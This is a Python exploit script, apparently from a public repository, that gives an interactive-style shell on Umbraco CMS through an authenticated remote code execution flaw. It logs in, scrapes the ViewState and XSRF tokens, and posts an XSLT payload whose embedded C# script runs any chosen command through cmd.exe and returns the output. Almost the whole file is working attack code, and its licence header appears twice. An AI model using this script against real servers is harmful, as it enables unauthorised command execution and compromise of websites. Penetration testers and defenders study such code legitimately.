#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This module implements a shell to exploit a RCE in umbraco CMS.
#    Copyright (C) 2024  exploit_shell_umbraco

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

'''
This module implements a shell to exploit a RCE in umbraco CMS.
'''

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = '''
This module implements a shell to exploit a RCE in umbraco CMS.
'''
__url__ = "https://github.com/mauricelambert/exploit_shell_umbraco"

# __all__ = []

__license__ = "GPL-3.0 License"
__copyright__ = '''
exploit_shell_umbraco  Copyright (C) 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
'''
copyright = __copyright__
license = __license__

print(copyright)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This module implements a shell to exploit a RCE in umbraco CMS.
#    Copyright (C) 2024  exploit_shell_umbraco

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

'''
This module implements a shell to exploit a RCE in umbraco CMS.
'''

__version__ = "0.0.1"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = '''
This module implements a shell to exploit a RCE in umbraco CMS.
'''
__url__ = "https://github.com/mauricelambert/exploit_shell_umbraco"

# __all__ = []

__license__ = "GPL-3.0 License"
__copyright__ = '''
exploit_shell_umbraco  Copyright (C) 2024  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
'''
copyright = __copyright__
license = __license__

print(copyright)

from json import dumps
from html.parser import HTMLParser
from xml.sax.saxutils import escape
from http.cookiejar import CookieJar
from urllib.parse import urlparse, urlencode
from sys import argv, executable, stderr, exit
from urllib.request import Request, HTTPCookieProcessor, build_opener

if len(argv) != 5 or any(
    x in argv for x in ("-h", "--help", "-?", "/?", "/h")
):
    print(
        "USAGES:",
        executable,
        argv[0],
        "[host] [username] [password] [command]",
        file=stderr,
    )
    print(
        "Example:",
        executable,
        argv[0],
        'http://10.10.100.101 admin p4SSw0rD "whoami /all"',
        file=stderr,
    )
    exit(1)

cookies = CookieJar()
urlopen = build_opener(HTTPCookieProcessor(cookies)).open


class GetHtmlValues(HTMLParser):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._exploit_values = {}
        self._tags = []

    def handle_data(self, data):
        if self._tags:
            print("[+] Found data:", data)

    def handle_starttag(self, tag, attrs):
        if self._tags:
            self._tags.append(tag)
        for name, value in attrs:
            if name == "id" and value in (
                "__VIEWSTATE",
                "__VIEWSTATEGENERATOR",
                "result",
            ):
                self._tags.append(tag)
                for name2, value2 in attrs:
                    if name2 == "value":
                        self._exploit_values[value] = value2
                        print(
                            "[+] Found",
                            repr(tag),
                            "with id",
                            repr(value),
                            "and value",
                            repr(value2),
                        )

    def handle_endtag(self, tag):
        if self._tags:
            if tag not in self._tags:
                print("[!] Not opened tag ! Close all.", tag, self._tags)
                self._tags = []
            elif tag != self._tags[-1]:
                while tag != self._tags[-1]:
                    print("[!] Unclosed tag !", tag, self._tags)
                    self._tags.pop()
            self._tags.remove(tag)


url_base = urlparse(argv[1])
login_url = url_base._replace(
    path="/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"
).geturl()
login_data = dumps({"username": argv[2], "password": argv[3]}).encode()

print("[*] Send login request")
login_request = Request(
    login_url,
    method="POST",
    headers={"Content-Type": "application/json; charset=UTF-8"},
    data=login_data,
)
login_response = urlopen(login_request)

print("[+] New cookies:", login_response.getheader("Set-Cookie"))

print("[*] Send GET request for CSRF token")
vulnerable_url = url_base._replace(
    path="/umbraco/developer/Xslt/xsltVisualize.aspx"
).geturl()

csrf_response = urlopen(Request(vulnerable_url, method="GET"))

values = GetHtmlValues()
values.feed(csrf_response.read().decode())

payload = f"""<?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">
        <msxsl:script language="C#" implements-prefix="csharp_user">
            public string xml() {{
                string cmd = "/c \\"{escape(argv[4].replace("^", "^^").replace('"', '^"'))}\\"";
                System.Diagnostics.Process proc = new System.Diagnostics.Process();
                proc.StartInfo.FileName = "C:\\\\Windows\\\\System32\\\\cmd.exe";
                proc.StartInfo.Arguments = cmd;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                return output;
            }}
        </msxsl:script>
        <xsl:template match="/">
            <xsl:value-of select="csharp_user:xml()"/>
        </xsl:template>
    </xsl:stylesheet>"""

headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
headers["UMB-XSRF-TOKEN"] = cookies._cookies[url_base.netloc]["/"][
    "UMB-XSRF-TOKEN"
].value
data_exploit = urlencode(
    {
        "__EVENTTARGET": "",
        "__EVENTARGUMENT": "",
        "__VIEWSTATE": values._exploit_values["__VIEWSTATE"],
        "__VIEWSTATEGENERATOR": values._exploit_values["__VIEWSTATEGENERATOR"],
        "ctl00$body$xsltSelection": payload,
        "ctl00$body$contentPicker$ContentIdValue": "",
        "ctl00$body$visualizeDo": "Visualize+XSLT",
    }
).encode()

request = Request(
    vulnerable_url,
    method="POST",
    headers=headers,
    data=data_exploit,
)
exploit_response = urlopen(request)
values.feed(exploit_response.read().decode())
